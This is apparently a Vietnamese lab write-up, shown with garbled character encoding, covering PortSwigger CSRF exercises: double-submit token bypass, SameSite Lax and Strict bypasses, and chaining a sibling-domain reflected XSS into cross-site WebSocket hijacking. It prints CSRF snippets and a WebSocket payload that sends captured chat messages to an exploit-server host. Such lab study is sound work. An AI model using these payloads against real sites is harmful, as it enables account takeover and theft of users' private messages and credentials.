**Double Submit Token** lÃ  ká»¹ thuáº­t chá»‘ng CSRF báº±ng cÃ¡ch gá»­i cÃ¹ng má»™t mÃ£ token trong cookie vÃ  body hoáº·c header cá»§a request. Server chá»‰ cáº§n so sÃ¡nh hai giÃ¡ trá»‹ nÃ y Ä‘á»ƒ xÃ¡c thá»±c yÃªu cáº§u.

```HTTP
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```

Káº» táº¥n cÃ´ng cÃ³ thá»ƒ tá»± táº¡o token giáº£ vÃ  Ä‘áº·t nÃ³ vÃ o trÃ¬nh duyá»‡t cá»§a náº¡n nhÃ¢n thÃ´ng qua tÃ­nh nÄƒng set-cookie, tá»« Ä‘Ã³ thá»±c hiá»‡n táº¥n cÃ´ng CSRF mÃ  khÃ´ng cáº§n token há»£p lá»‡.

### LAB05

Lab nÃ y Ä‘Æ°á»£c cung cáº¥p 1 tÃ i khoáº£n `weiner:peter`

![image](https://hackmd.io/_uploads/BJCbvS9Dlx.png)

Khi update email thÃ¬ á»©ng dá»¥ng cÃ³ triá»ƒn khai Double Submit token => chá»‘ng CSRF 

![image](https://hackmd.io/_uploads/BJPBDrqvgg.png)

NhÆ°ng trong chá»©c nÄƒng search cá»§a web láº¡i ko set `csrf` trong response. 

![image](https://hackmd.io/_uploads/SJEswScDle.png)

NhÆ° váº­y náº¿u mÃ¬nh chÃ¨n nhÆ° sau:

![image](https://hackmd.io/_uploads/HksGOS5Plx.png)

NhÆ° váº­y thÃ¬ mÃ¬nh hoÃ n toÃ n cÃ³ thá»ƒ khai thÃ¡c CSRF nhÆ° sau: 

![image](https://hackmd.io/_uploads/HkdIFS9Dlg.png)

## VÆ°á»£t qua cÃ¡c háº¡n cháº¿ cá»§a cookie SameSite 

SameSite lÃ  cÆ¡ cháº¿ báº£o máº­t cá»§a trÃ¬nh duyá»‡t giÃºp háº¡n cháº¿ viá»‡c gá»­i cookie trong cÃ¡c request giá»¯a cÃ¡c trang web, nháº±m giáº£m thiá»ƒu rá»§i ro tá»« cÃ¡c cuá»™c táº¥n cÃ´ng nhÆ° `CSRF`, rÃ² rá»‰ dá»¯ liá»‡u vÃ  khai thÃ¡c `CORS`. 
Tá»« nÄƒm 2021, Chrome máº·c Ä‘á»‹nh Ã¡p dá»¥ng chÃ­nh sÃ¡ch `SameSite=Lax` náº¿u khÃ´ng cÃ³ thiáº¿t láº­p rÃµ rÃ ng tá»« mÃ¡y chá»§. Hiá»ƒu rÃµ cÃ¡ch hoáº¡t Ä‘á»™ng vÃ  cÃ¡c ká»¹ thuáº­t vÆ°á»£t qua háº¡n cháº¿ SameSite lÃ  Ä‘iá»u quan trá»ng Ä‘á»ƒ Ä‘Ã¡nh giÃ¡ vÃ  khai thÃ¡c cÃ¡c lá»— há»•ng liÃªn quan Ä‘áº¿n táº¥n cÃ´ng giá»¯a cÃ¡c trang web.

## KhÃ¡i niá»‡m `"site"` trong ngá»¯ cáº£nh cá»§a cookie SameSite 

Trong ngá»¯ cáº£nh nÃ y thÃ¬ `"site"` Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a lÃ  **tÃªn miá»n cáº¥p cao nháº¥t (TLD)** - thÆ°á»ng lÃ  `.com`, `.net`,... - kÃ¨m theo 1 tÃªn miá»n cáº¥p ná»¯a, táº¡o thÃ nh cáº¥u trÃºc gá»i lÃ  **`LD+1`** 

Khi xÃ¡c Ä‘á»‹nh 1 request cÃ³ pháº£i lÃ  **SameSite** hay ko cÅ©ng dá»±a vÃ o giao thá»©c, vÃ­ dá»¥: tá»« `http://example.com` Ä‘áº¿n `https://example.com` thÃ¬ truyá»n duyá»‡t coi lÃ  `cross-site`. 

![site-definition](https://hackmd.io/_uploads/SyPAb82Dgl.png)

`eTLD` => effective top-level domain eTLD lÃ  khÃ¡i niá»‡m dÃ¹ng Ä‘á»ƒ xá»­ lÃ½ nhá»¯ng tÃªn miá»n nhiá»u pháº§n Ä‘áº·c biá»‡t nhÆ° `.co.uk`, vÃ¬ chÃºng Ä‘Æ°á»£c xem nhÆ° TLD trong thá»±c táº¿ sá»­ dá»¥ng.

## Sá»± khÃ¡c biá»‡t giá»¯a `site` vÃ  `origin` lÃ  gÃ¬? 

âœ… Origin lÃ  pháº¡m vi háº¹p, Ä‘áº¡i diá»‡n cho má»™t URL cá»¥ thá»ƒ, gá»“m:
ğŸ‘‰ **scheme + domain + port**
â†’ Pháº£i giá»‘ng hoÃ n toÃ n cáº£ 3 thÃ¬ má»›i gá»i lÃ  **same-origin**.

âœ… Site lÃ  pháº¡m vi rá»™ng hÆ¡n, gá»“m nhiá»u origin cÃ³ cÃ¹ng â€œmiá»n gá»‘câ€.
ğŸ‘‰ Chá»‰ cáº§n giá»‘ng:
- scheme, vÃ 
- eTLD+1 (vÃ­ dá»¥: example.com, cyberjutsu.io)

â†’ CÃ³ thá»ƒ khÃ¡c subdomain vÃ  khÃ¡c port
â†’ Váº«n Ä‘Æ°á»£c coi lÃ  same-site.

ğŸ“˜ VÃ­ dá»¥ minh há»a:
https://a.example.com vÃ  https://b.example.com
â†’ âŒ KhÃ¡c origin
â†’ âœ… CÃ¹ng site

https://example.com:443 vÃ  https://example.com:8443
â†’ âŒ KhÃ¡c origin
â†’ âœ… CÃ¹ng site

Tá»« Ä‘Ã¢y mÃ¬nh cÃ³ thá»ƒ Ä‘á»c chi tiáº¿t táº¡i Ä‘Ã¢y: [Same Origin vÃ  Cross Origin](https://htmli.cyberjutsu-lab.tech/pages/sandbox/#level_4)

## SameSite hoáº¡t Ä‘á»™ng nhÆ° tháº¿ nÃ o ? 

TrÆ°á»›c Ä‘Ã¢y, trÃ¬nh duyá»‡t luÃ´n gá»­i cookie dÃ¹ request Ä‘áº¿n tá»« trang nÃ o, nÃªn dá»… bá»‹ CSRF.
CÆ¡ cháº¿ SameSite giÃºp giá»›i háº¡n viá»‡c gá»­i cookie chá»‰ khi request thá»±c sá»± Ä‘áº¿n tá»« cÃ¹ng site, tá»« Ä‘Ã³ ngÄƒn cháº·n táº¥n cÃ´ng CSRF.

CÃ³ 3 loáº¡i SameSite chÃ­nh lÃ : 
- `Strict`
- `Lax`
- `None` 

ThÃ¬ dev cÃ³ thá»ƒ thiáº¿t láº­p trong pháº§n cookie qua thuá»™c tÃ­nh `SameSite` trong header `Set-Cookie`.
```HTTP
Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict
``` 

Tuy nhiÃªn, chá»‰ dá»±a vÃ o **SameSite** lÃ  khÃ´ng Ä‘á»§ an toÃ n tuyá»‡t Ä‘á»‘i â€“ káº» táº¥n cÃ´ng váº«n cÃ³ thá»ƒ khai thÃ¡c trong má»™t sá»‘ tÃ¬nh huá»‘ng Ä‘áº·c biá»‡t.

Náº¿u báº¡n khÃ´ng Ä‘áº·t SameSite cho cookie, Chrome sáº½ máº·c Ä‘á»‹nh Ã¡p dá»¥ng `SameSite=Lax` Ä‘á»ƒ tÄƒng cÆ°á»ng báº£o máº­t.
Äiá»u nÃ y giÃºp giáº£m nguy cÆ¡ bá»‹ CSRF, ká»ƒ cáº£ khi láº­p trÃ¬nh viÃªn quÃªn khÃ´ng cáº¥u hÃ¬nh

### Strict 

âœ… **SameSite=Strict = ráº¥t an toÃ n**, khÃ´ng bao giá» gá»­i cookie náº¿u request Ä‘áº¿n tá»« trang khÃ¡c.
âœ… ThÃ­ch há»£p cho cÃ¡c cookie quan trá»ng, liÃªn quan Ä‘áº¿n quyá»n (auth, CSRF).
âŒ NhÆ°ng cÃ³ thá»ƒ gÃ¢y lá»—i hoáº·c báº¥t tiá»‡n náº¿u á»©ng dá»¥ng cáº§n tÆ°Æ¡ng tÃ¡c cross-site nhÆ°: SSO, liÃªn káº¿t tá»« email, redirect tá»« app khÃ¡c...

### Lax 

**SameSite=Lax** chá»‰ cho gá»­i cookie khi:

âœ…GET request
âœ…VÃ  do ngÆ°á»i dÃ¹ng click link, chuyá»ƒn trang.

KhÃ´ng gá»­i cookie náº¿u lÃ :
âŒPOST cross-site
âŒRequest tá»« iframe, script, áº£nh...

ğŸ‘‰ Äiá»u nÃ y giÃºp giáº£m rá»§i ro CSRF nhÆ°ng váº«n cho phÃ©p ngÆ°á»i dÃ¹ng báº¥m link tá»« email / web khÃ¡c Ä‘á»ƒ Ä‘Äƒng nháº­p.

### None 

âœ…**SameSite=None** â†’ Gá»­i cookie trong má»i request, ká»ƒ cáº£ tá»« trang khÃ¡c.
TrÆ°á»›c Ä‘Ã¢y, náº¿u khÃ´ng ghi SameSite, thÃ¬ trÃ¬nh duyá»‡t (trá»« Chrome) coi nhÆ° lÃ  None.

ğŸ‘‰ Há»¯u Ã­ch khi:
- Cookie dÃ¹ng á»Ÿ bÃªn thá»© ba (VD: nhÃºng iframe, phÃ¢n tÃ­ch, theo dÃµi).
- Cookie khÃ´ng nháº¡y cáº£m.

âŒ Tuy nhiÃªn:
Má»™t sá»‘ web dÃ¹ng None cho má»i cookie, ká»ƒ cáº£ cookie Ä‘Äƒng nháº­p â†’ nguy hiá»ƒm, dá»… bá»‹ CSRF.

Khi thiáº¿t láº­p cookie vá»›i **SameSite=None**, trang web cÅ©ng pháº£i kÃ¨m theo thuá»™c tÃ­nh **Secure**, nháº±m Ä‘áº£m báº£o ráº±ng cookie chá»‰ Ä‘Æ°á»£c gá»­i qua cÃ¡c káº¿t ná»‘i Ä‘Æ°á»£c mÃ£ hÃ³a báº±ng **HTTPS**. Náº¿u khÃ´ng, trÃ¬nh duyá»‡t sáº½ tá»« chá»‘i cookie vÃ  nÃ³ sáº½ khÃ´ng Ä‘Æ°á»£c thiáº¿t láº­p.

```HTTP
Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; Secure
``` 

## Bypass SameSite Lax báº±ng cÃ¡ch dÃ¹ng GET requests 

TrÃªn thá»±c táº¿, cÃ¡c mÃ¡y chá»§ khÃ´ng pháº£i lÃºc nÃ o cÅ©ng kháº¯t khe vá» viá»‡c nháº­n yÃªu cáº§u `GET` hay `POST` cho má»™t endpoint nháº¥t Ä‘á»‹nh, ká»ƒ cáº£ khi endpoint Ä‘Ã³ dá»± kiáº¿n nháº­n dá»¯ liá»‡u tá»« má»™t biá»ƒu máº«u (form).

Náº¿u mÃ¡y chá»§ cÅ©ng dÃ¹ng thuá»™c tÃ­nh **SameSite=Lax** cho cookie phiÃªn (session cookie) â€“ dÃ¹ Ä‘Æ°á»£c cáº¥u hÃ¬nh rÃµ rÃ ng hay do trÃ¬nh duyá»‡t tá»± gÃ¡n máº·c Ä‘á»‹nh â€“ thÃ¬ báº¡n váº«n cÃ³ thá»ƒ thá»±c hiá»‡n **táº¥n cÃ´ng CSRF** báº±ng cÃ¡ch khiáº¿n trÃ¬nh duyá»‡t náº¡n nhÃ¢n gá»­i má»™t yÃªu cáº§u `GET`.

Miá»…n lÃ  trÃ¬nh duyá»‡t Ä‘ang chuyá»ƒn hÆ°á»›ng chÃ­nh (top-level navigation), thÃ¬ cookie cá»§a phiÃªn Ä‘Äƒng nháº­p váº«n sáº½ Ä‘Æ°á»£c gá»­i Ä‘i. 

ğŸ’¡ Hiá»ƒu Ä‘Æ¡n giáº£n lÃ :
ğŸ§ª Khi náº¡n nhÃ¢n báº¥m vÃ o 1 Ä‘Æ°á»ng link vÃ  trÃ¬nh duyá»‡t chuyá»ƒn Ä‘áº¿n trang má»›i â†’ Ä‘Ã³ gá»i lÃ  top-level navigation.
ğŸ§ª Náº¿u cookie cÃ³ thuá»™c tÃ­nh SameSite=Lax, thÃ¬ trÃ¬nh duyá»‡t sáº½ gá»­i cookie Ä‘Ã³ Ä‘i, dÃ¹ trang má»›i lÃ  tá»« website khÃ¡c (cross-site).
ğŸ§ª VÃ¬ váº­y, attacker cÃ³ thá»ƒ lá»£i dá»¥ng Ä‘iá»u nÃ y Ä‘á»ƒ táº¥n cÃ´ng CSRF.

```javascript
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
``` 

Ngay cáº£ khi má»™t request GET thÃ´ng thÆ°á»ng khÃ´ng Ä‘Æ°á»£c cháº¥p nháº­n, má»™t sá»‘ framework váº«n cung cáº¥p cÃ¡ch Ä‘á»ƒ ghi Ä‘Ã¨ phÆ°Æ¡ng thá»©c (method) Ä‘Æ°á»£c chá»‰ Ä‘á»‹nh trong dÃ²ng Ä‘áº§u cá»§a request.

VÃ­ dá»¥, **Symfony** há»— trá»£ tham sá»‘ **_method** trong cÃ¡c form, tham sá»‘ nÃ y sáº½ Ä‘Æ°á»£c Æ°u tiÃªn hÆ¡n phÆ°Æ¡ng thá»©c HTTP thÃ´ng thÆ°á»ng khi xá»­ lÃ½ Ä‘á»‹nh tuyáº¿n (routing):

```HTML
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```
VÃ  ngoÃ i nhá»¯ng framework khÃ¡c thÃ¬ nÃ³ cÃ³ tham sá»‘ há»— trá»£ khÃ¡c.

### LAB06 

Lab nÃ y mÃ¬nh cÅ©ng Ä‘Æ°á»£c cáº¥p 1 tk `wiener:peter` => sau Ä‘Ã³ mÃ¬nh cÅ©ng thá»±c hiá»‡n thay Ä‘á»•i email. 

![image](https://hackmd.io/_uploads/SkEd9apvgl.png)

NhÆ° váº­y cÃ³ thá»ƒ hoÃ n toÃ n cÃ³ thá»ƒ táº¥n cÃ´ng CSRF vÃ¬ cookie session cÃ³ thá»ƒ gá»­i cross-site vá»›i GET request, miá»…n lÃ  chuyá»ƒn hÆ°á»›ng top-level. 

![image](https://hackmd.io/_uploads/S1PBop6wxe.png)

NÃ³ hoÃ n toÃ n cÃ³ thá»ƒ thay Ä‘á»•i email. 

![image](https://hackmd.io/_uploads/BJQIjTTDxe.png)

NhÆ° váº­y mÃ¬nh cÃ³ thá»ƒ khai thÃ¡c nhÆ° sau Ä‘á»ƒ gá»­i Ä‘áº¿n náº¡n nhÃ¢n. 

![image](https://hackmd.io/_uploads/SJVkhT6veg.png)

## Bypass háº¡n cháº¿ SameSite báº±ng cÃ¡ch sá»­ dá»¥ng cÃ¡c thÃ nh pháº§n cÃ³ sáºµn trÃªn Web (on-site gadgets) 

Náº¿u Ä‘Æ°á»£c set thuá»™c tÃ­nh lÃ  `SameSite=Strict` sáº½ khÃ´ng Ä‘Æ°á»£c gá»­i trong cÃ¡c yÃªu cáº§u cross-site, nhÆ°ng háº¡n cháº¿ nÃ y cÃ³ thá»ƒ bá»‹ vÆ°á»£t qua náº¿u khai thÃ¡c Ä‘Æ°á»£c cÃ¡c thÃ nh pháº§n ná»™i táº¡i cÃ³ kháº£ nÄƒng táº¡o yÃªu cáº§u ná»™i bá»™ trong cÃ¹ng miá»n.

Chá»©c nÄƒng chuyá»ƒn hÆ°á»›ng cÃ³ thá»ƒ bá»‹ lá»£i dá»¥ng Ä‘á»ƒ Ä‘Ã¡nh lá»«a trÃ¬nh duyá»‡t ráº±ng yÃªu cáº§u xuáº¥t phÃ¡t tá»« cÃ¹ng miá»n, qua Ä‘Ã³ vÆ°á»£t qua Ä‘Æ°á»£c báº£o vá»‡ cá»§a SameSite.

TrÃ¬nh duyá»‡t coi chuyá»ƒn hÆ°á»›ng phÃ­a client nhÆ° má»™t yÃªu cáº§u bÃ¬nh thÆ°á»ng trong cÃ¹ng miá»n, nÃªn váº«n gá»­i kÃ¨m cookie. Náº¿u hacker Ä‘iá»u khiá»ƒn Ä‘Æ°á»£c chuyá»ƒn hÆ°á»›ng nÃ y Ä‘á»ƒ gá»­i yÃªu cáº§u Ä‘á»™c háº¡i, thÃ¬ cÃ³ thá»ƒ bá» qua luÃ´n háº¡n cháº¿ cá»§a SameSite.

LÆ°u Ã½:
- Client-side redirect: CÃ³ thá»ƒ dÃ¹ng Ä‘á»ƒ vÆ°á»£t qua SameSite vÃ¬ request Ä‘Æ°á»£c coi lÃ  cÃ¹ng miá»n.
- Server-side redirect: KhÃ´ng thá»ƒ bypass SameSite vÃ¬ request gá»‘c lÃ  cross-site nÃªn trÃ¬nh duyá»‡t khÃ´ng gá»­i cookie. 

### LAB07 

Lab nÃ y cÅ©ng Ä‘Æ°á»£c cung cáº¥p 1 tÃ i khoáº£n `wiener:peter`. 

ThÃ¬ nÃ³ cÃ³ 1 chá»©c nÄƒng comment lÃ  khi Ä‘Ã³ submit thÃ¬ nÃ³ sáº½ chuyá»ƒn hÆ°á»›ng tá»›i `/post/comment/confirmation?postId=x` sau Ä‘Ã³ chuyá»ƒn hÆ°á»›ng vá» láº¡i trang bÃ i post. 

Quan sÃ¡t trong burp thÃ¬ tháº¥y cÃ³ gá»i tá»›i 1 endpoint file JS. 

![image](https://hackmd.io/_uploads/SknM3g1_gx.png)

NhÆ° váº­y náº¿u mÃ¬nh thay Ä‘á»•i `postId` thÃ nh 1 `postId` ko cÃ³ tháº­t Ä‘á»ƒ xem pháº£n á»©ng. 

![image](https://hackmd.io/_uploads/BJ5c2x1_xe.png)

NÃ³ hoÃ n toÃ n chuyá»ƒn hÆ°á»›ng vá» `/post/helloanhem` nhÆ° sau: 

![image](https://hackmd.io/_uploads/H170neydlx.png)

Náº¿u thá»­ mÃ¬nh inject path traversal vÃ o tham sá»‘ nÃ y thÃ¬ nhÆ° tháº¿ nÃ o ?
 
![image](https://hackmd.io/_uploads/H1XKTgkuee.png)

ThÃ¬ nÃ³ chuyá»ƒn hÆ°á»›ng vá» `my-account`, váº­y náº¿u lá»£i dá»¥ng Ä‘á»ƒ nÃ³ chuyá»ƒn hÆ°á»›ng vá» `change-email` thÃ¬ sao. 

![image](https://hackmd.io/_uploads/HkfkW-1Oex.png)

## Bypass SameSite thÃ´ng qua cÃ¡c tÃªn miÃªn liÃªn quan cÃ³ lá»— há»•ng 

Má»™t request váº«n cÃ³ thá»ƒ Ä‘Æ°á»£c coi lÃ  same-site, ngay cáº£ khi Ä‘áº¿n tá»« má»™t origin khÃ¡c â€“ Ä‘iá»u nÃ y ráº¥t quan trá»ng khi kiá»ƒm thá»­ hoáº·c báº£o vá»‡ web.

Cáº§n kiá»ƒm tra ká»¹ táº¥t cáº£ cÃ¡c subdomain vÃ¬ chá»‰ má»™t lá»— há»•ng nhÆ° XSS trÃªn má»™t tÃªn miá»n anh em cÅ©ng cÃ³ thá»ƒ khiáº¿n toÃ n bá»™ há»‡ thá»‘ng bá»‹ táº¥n cÃ´ng cross-site, vÆ°á»£t qua cÃ¡c cÆ¡ cháº¿ báº£o vá»‡ nhÆ° SameSite.

NgoÃ i CSRF truyá»n thá»‘ng, náº¿u á»©ng dá»¥ng dÃ¹ng WebSocket, cáº§n Ä‘á» phÃ²ng táº¥n cÃ´ng CSWSH â€“ má»™t dáº¡ng CSRF nháº¯m vÃ o quÃ¡ trÃ¬nh handshake cá»§a WebSocket.

### LAB08 

Vá»›i lab nÃ y thÃ¬ cÃ³ chá»©c nÄƒng chat vÃ  mÃ¬nh cáº§n chiáº¿m quyá»n WebSocket qua cross-site (CSWSH). 

Khi truy cáº­p `/chat` => thÃ¬ nháº­n 1 response nhÆ° sau: 

![image](https://hackmd.io/_uploads/rJcnYb1ule.png)

Khi Ä‘Ã³ tháº¥y 101 Switching Protocol thÃ¬ nÃ³ sáº½ nÃ¢ng cáº¥p lÃªn Websocket. 

![image](https://hackmd.io/_uploads/rJZobr1ule.png)

Tá»« Ä‘Ã³ nÃ³ fetch tá»›i endpoint lÃ  `chat.js` vÃ  hÃ¬nh nhÆ° lÆ°u táº¡i: `https://cms-0aa1000c03396524806d1c66009b000e.web-security-academy.net`

![image](https://hackmd.io/_uploads/B1wWGrJ_xe.png)

ThÃ¬ toÃ n bá»™ source nÃ³ náº±m á»Ÿ Ä‘Ã¢y: 
```javascript
(function () {
    var chatForm = document.getElementById("chatForm");
    var messageBox = document.getElementById("message-box");
    var webSocket = openWebSocket();

    messageBox.addEventListener("keydown", function (e) {
        if (e.key === "Enter" && !e.shiftKey) {
            e.preventDefault();
            sendMessage(new FormData(chatForm));
            chatForm.reset();
        }
    });

    chatForm.addEventListener("submit", function (e) {
        e.preventDefault();
        sendMessage(new FormData(this));
        this.reset();
    });

    function writeMessage(className, user, content) {
        var row = document.createElement("tr");
        row.className = className

        var userCell = document.createElement("th");
        var contentCell = document.createElement("td");
        userCell.innerHTML = user;
        contentCell.innerHTML = (typeof window.renderChatMessage === "function") ? window.renderChatMessage(content) : content;

        row.appendChild(userCell);
        row.appendChild(contentCell);
        document.getElementById("chat-area").appendChild(row);
    }

    function sendMessage(data) {
        var object = {};
        data.forEach(function (value, key) {
            object[key] = htmlEncode(value);
        });

        openWebSocket().then(ws => ws.send(JSON.stringify(object)));
    }

    function htmlEncode(str) {
        if (chatForm.getAttribute("encode")) {
            return String(str).replace(/['"<>&\r\n\\]/gi, function (c) {
                var lookup = {'\\': '&#x5c;', '\r': '&#x0d;', '\n': '&#x0a;', '"': '&quot;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '&': '&amp;'};
                return lookup[c];
            });
        }
        return str;
    }

    function openWebSocket() {
       return new Promise(res => {
            if (webSocket) {
                res(webSocket);
                return;
            }

            let newWebSocket = new WebSocket(chatForm.getAttribute("action"));

            newWebSocket.onopen = function (evt) {
                writeMessage("system", "System:", "No chat history on record");
                newWebSocket.send("READY");
                res(newWebSocket);
            }

            newWebSocket.onmessage = function (evt) {
                var message = evt.data;

                if (message === "TYPING") {
                    writeMessage("typing", "", "[typing...]")
                } else {
                    var messageJson = JSON.parse(message);
                    if (messageJson && messageJson['user'] !== "CONNECTED") {
                        Array.from(document.getElementsByClassName("system")).forEach(function (element) {
                            element.parentNode.removeChild(element);
                        });
                    }
                    Array.from(document.getElementsByClassName("typing")).forEach(function (element) {
                        element.parentNode.removeChild(element);
                    });

                    if (messageJson['user'] && messageJson['content']) {
                        writeMessage("message", messageJson['user'] + ":", messageJson['content'])
                    } else if (messageJson['error']) {
                        writeMessage('message', "Error:", messageJson['error']);
                    }
                }
            };

            newWebSocket.onclose = function (evt) {
                webSocket = undefined;
                writeMessage("message", "System:", "--- Disconnected ---");
            };
        });
    }
})();
```

Giá» mÃ¬nh phÃ¢n tÃ­ch thá»­ nha!! 

NÃ³ sá»­ dá»¥ng Websocket trong chat: 

```javascript
var webSocket = openWebSocket(); 
```

VÃ  trong `openWebSocket()` cÃ³ `let newWebSocket = new WebSocket(chatForm.getAttribute("action"));`

VÃ  hÃ m `sendMessage()` gá»i tá»›i hÃ m `htmlEncode()` Ä‘á»ƒ encode input: 

```javascript
function htmlEncode(str) {
        if (chatForm.getAttribute("encode")) {
            return String(str).replace(/['"<>&\r\n\\]/gi, function (c) {
                var lookup = {'\\': '&#x5c;', '\r': '&#x0d;', '\n': '&#x0a;', '"': '&quot;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '&': '&amp;'};
                return lookup[c];
            });
        }
        return str;
    }

```

MÃ¬nh thá»­ chat trong box chat nÃ y. VÃ  quan sÃ¡t trong tab Websocket history. 

![image](https://hackmd.io/_uploads/HyeAVHyOxe.png)

Sau Ä‘Ã³ mÃ¬nh gá»­i nÃ³ sang repeater. 

![image](https://hackmd.io/_uploads/SksyBryOee.png)

ThÃ¬ ra Ä‘Ã¢y lÃ  dáº¥u hiá»‡u khi báº¯t Ä‘áº§u 1 WebSocket.

NhÆ° váº­y, quan sÃ¡t Websocket history Ä‘á»ƒ báº¯t Ä‘áº§u thÃ¬ sáº½ cÃ³ client gá»­i tá»›i server `READY`.

![image](https://hackmd.io/_uploads/BkLhIHk_gx.png)

ThÃ¬ cháº¡y thÃ¬ nÃ³ tráº£ vá» 1 response chá»©a 

![image](https://hackmd.io/_uploads/Syd-Prydxe.png)

Tuy nhiÃªn, á»Ÿ Ä‘Ã¢y nÃ³ Ä‘Ã£ má»Ÿ ra 1 chat má»›i. Bá»Ÿi vÃ¬ nÃ³ láº¥y file javascript tá»« domain lÃ  `cms-0aa1000c03396524806d1c66009b000e.web-security-academy.net`

Khi truy cáº­p `/` thÃ¬ nÃ³ chuyá»ƒn hÆ°á»›ng thÃ nh  1 trang login. 

![image](https://hackmd.io/_uploads/Bksqwr1dle.png)

Vá»›i cÃ¡c pháº§n quan trong header lÃ : 

![image](https://hackmd.io/_uploads/SyAAwB1Oge.png)

```HTTP 
Set-Cookie: session=XH1lyeJKQkrj8TLLQk58lLW7d3aI6hxM; Secure; HttpOnly; SameSite=Strict
``` 

ThÃ¬ á»Ÿ Ä‘Ã¢y nÃ³ Ä‘Ã£ Ä‘Æ°á»£c 1 session má»›i cho mÃ¬nh vÃ  cáº£ `SameSite=Strict` thÃ¬ nÃ³ yÃªu cáº§u trÃ¬nh duyá»‡t ko gá»­i Ä‘i báº¥t ká»³ request cross-site nÃ o. 

NÃªn bÃ¢y giá» mÃ¬nh thá»­ login vá»›i payload `<h1>test</h1>`. 

![image](https://hackmd.io/_uploads/rJhi_Hk_xl.png)

NÃ³ hoÃ n toÃ n bá»‹ dÃ­nh Reflected XSS! 

VÃ  sau má»™t há»“i thÃ¬ mÃ¬nh trigger báº±ng GET. 

![image](https://hackmd.io/_uploads/BJK-tHyOlg.png)

NÃ³ chuyá»n payload vÃ o thÃ¬ Ä‘Æ°á»£c nhÆ° sau: 

![image](https://hackmd.io/_uploads/r1c4FHkugg.png)

Tá»•ng káº¿t láº¡i thÃ¬ mÃ¬nh tÃ¬m tháº¥y: 
- 1 CSWSH trong live chat 
- 1 Reflected XSS trong domain `cms` 

ThÃ¬ theo á»Ÿ Ä‘Ã£ biáº¿t thÃ¬ `cms-0aa1000c03396524806d1c66009b000e.web-security-academy.net` thÃ¬ nÃ³ lÃ  má»™t **same-site**. 

Tá»« Ä‘Ã¢y mÃ¬nh cÃ³ thá»ƒ dÃ¹ng XSS Ä‘á»ƒ lÃ m CSWSH mÃ  ko bá»‹ háº¡n cháº¿ vá» SameSite: 

CSWSH payload: 
```HTML
<script>
    var webSocket = new WebSocket('wss://0aa1000c03396524806d1c66009b000e.web-security-academy.net/chat');
    webSocket.onopen = function() {
        webSocket.send("READY");
    };
    webSocket.onmessage = function(event) {
        fetch('https://exploit-0aa20059034a04d8c0be9f8801ea0097.exploit-server.net/log?'+event.data, {method: 'GET'});
    };
</script>
``` 

Sau Ä‘Ã³, mÃ¬nh URL encode payload CSWSH: 

```
%3Cscript%3E%0A%20%20%20%20var%20webSocket%20%3D%20new%20WebSocket%28%27wss%3A%2F%2F0aa1000c03396524806d1c66009b000e.web-security-academy.net%2Fchat%27%29%3B%0A%20%20%20%20webSocket.onopen%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20webSocket.send%28%22READY%22%29%3B%0A%20%20%20%20%7D%3B%0A%20%20%20%20webSocket.onmessage%20%3D%20function%28event%29%20%7B%0A%20%20%20%20%20%20%20%20fetch%28%27https%3A%2F%2Fexploit-0aa20059034a04d8c0be9f8801ea0097.exploit-server.net%2Flog%3F%27%2Bevent.data%2C%20%7Bmethod%3A%20%27GET%27%7D%29%3B%0A%20%20%20%20%7D%3B%0A%3C%2Fscript%3E
``` 

Tiáº¿p theo cÃ¡i payload XSS táº¡i `cms` lÃ : 

```
http://cms-0aa1000c03396524806d1c66009b000e.web-security-academy.net/login?username=3Cscript%3E%0A%20%20%20%20var%20webSocket%20%3D%20new%20WebSocket%28%27wss%3A%2F%2F0aa1000c03396524806d1c66009b000e.web-security-academy.net%2Fchat%27%29%3B%0A%20%20%20%20webSocket.onopen%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20webSocket.send%28%22READY%22%29%3B%0A%20%20%20%20%7D%3B%0A%20%20%20%20webSocket.onmessage%20%3D%20function%28event%29%20%7B%0A%20%20%20%20%20%20%20%20fetch%28%27https%3A%2F%2Fexploit-0aa20059034a04d8c0be9f8801ea0097.exploit-server.net%2Flog%3F%27%2Bevent.data%2C%20%7Bmethod%3A%20%27GET%27%7D%29%3B%0A%20%20%20%20%7D%3B%0A%3C%2Fscript%3E&password=123
```

Cuá»‘i cÃ¹ng, mÃ¬nh táº¡o ra 1 HTML payload dá»±a trÃªn cÃ¡i payload XSS á»Ÿ trÃªn: 

```javascript
<script>
    document.locaton = 'http://cms-0aa1000c03396524806d1c66009b000e.web-security-academy.net/login?username=3Cscript%3E%0A%20%20%20%20var%20webSocket%20%3D%20new%20WebSocket%28%27wss%3A%2F%2F0aa1000c03396524806d1c66009b000e.web-security-academy.net%2Fchat%27%29%3B%0A%20%20%20%20webSocket.onopen%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20webSocket.send%28%22READY%22%29%3B%0A%20%20%20%20%7D%3B%0A%20%20%20%20webSocket.onmessage%20%3D%20function%28event%29%20%7B%0A%20%20%20%20%20%20%20%20fetch%28%27https%3A%2F%2Fexploit-0aa20059034a04d8c0be9f8801ea0097.exploit-server.net%2Flog%3F%27%2Bevent.data%2C%20%7Bmethod%3A%20%27GET%27%7D%29%3B%0A%20%20%20%20%7D%3B%0A%3C%2Fscript%3E&password=123)';
</script>
```

![image](https://hackmd.io/_uploads/H1lIjUJdgl.png)

Sau Ä‘Ã³ nÃ³ tráº£ vá» ná»™i dung chat mÃ  cháº³ng may trong Ä‘Ã³ cÃ³ tÃ i khoáº£n. 

![image](https://hackmd.io/_uploads/r18dsLkOgl.png)

